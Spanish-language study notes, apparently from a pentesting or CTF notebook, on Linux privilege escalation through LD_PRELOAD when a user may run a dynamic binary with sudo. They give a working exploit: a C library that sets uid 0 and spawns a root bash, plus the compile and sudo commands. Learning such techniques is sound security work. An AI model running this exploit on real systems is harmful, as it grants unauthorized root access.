## üõ†Ô∏è **Escalada de privilegios con `LD_PRELOAD` sobre binarios din√°micos**

### üî¥ **Resumen de la vulnerabilidad**

Cuando tienes **permisos `sudo` sobre un binario din√°mico** (es decir, que carga librer√≠as compartidas `.so`), puedes abusar de la variable de entorno `LD_PRELOAD` para inyectar una librer√≠a maliciosa. Esto permite ejecutar c√≥digo arbitrario como **root**, logrando una escalada de privilegios inmediata.

### üß© **Conceptos clave**

- **Librer√≠as din√°micas** (`.so`): son m√≥dulos que un programa carga en tiempo de ejecuci√≥n. A diferencia de las librer√≠as est√°ticas (`.a`), no forman parte del binario, sino que se buscan y cargan desde el sistema cuando se ejecuta.
    
- **`LD_PRELOAD`**: es una variable de entorno que permite cargar una librer√≠a `.so` personalizada **antes** de que el programa cargue sus librer√≠as normales. Las funciones de la `.so` inyectada tendr√°n prioridad sobre las originales.

## ‚öôÔ∏è **Requisitos para que funcione**

1. **Tener permisos `sudo` sobre un binario din√°mico**:
    
    - El binario debe poder ser ejecutado con `sudo` sin restricciones adicionales.
    - Ejemplo de `sudo -l`:
		```bash
		(root) /usr/bin/less
		```
2.  El binario debe de ser din√°mico:
	-  Es decir, que cargue librer√≠as `.so` en tiempo de ejecuci√≥n.
	- **Binarios est√°ticos NO son vulnerables** a `LD_PRELOAD`.
3.  **Que la configuraci√≥n de `sudo` no bloquee variables de entorno peligrosas**:
    - No debe haber protecciones como `env_reset` bloqueando `LD_PRELOAD`.

## üîç **C√≥mo detectar binarios din√°micos**

üìå M√©todo 1: `file`
```
file /usr/bin/less
```

Resultado esperado:
```python
/usr/bin/less: ELF 64-bit LSB shared object, dynamically linked, ...
```

üìå M√©todo 2: `ldd`
```bash
ldd /usr/bin/less
```
Si devuelve una lista de `.so` es din√°mico, por ejemplo:
```bash
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (...)
```

## üöÄ **Explotaci√≥n**

1. C√≥digo de la librer√≠a maliciosa (`root.c`):
	```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
	```
2. Compilar librer√≠a:
	```bash
	gcc -fPIC -shared -o root.so root.c -nostartfiles
	```
3. Ejecutar con `sudo`:
	```bash
	sudo LD_PRELOAD=./root.so /usr/bin/less
	```
‚úÖ **Resultado:** obtienes una **shell como root**.

### ‚ö†Ô∏è **Notas importantes**

- Esto **NO funciona sobre binarios SUID root**, ya que ignoran `LD_PRELOAD`.
- Solo es efectivo cuando tienes `sudo` sobre un binario din√°mico y la configuraci√≥n de `sudoers` es laxa.
### üö© **Checklist r√°pida**

‚úî Binario es din√°mico (`ldd` o `file` te lo confirman).  
‚úî Permisos `sudo` sobre el binario (`sudo -l`).  
‚úî `sudo` no filtra `LD_PRELOAD` (`env_reset` o configuraciones similares).  
‚úî El binario no es SUID root.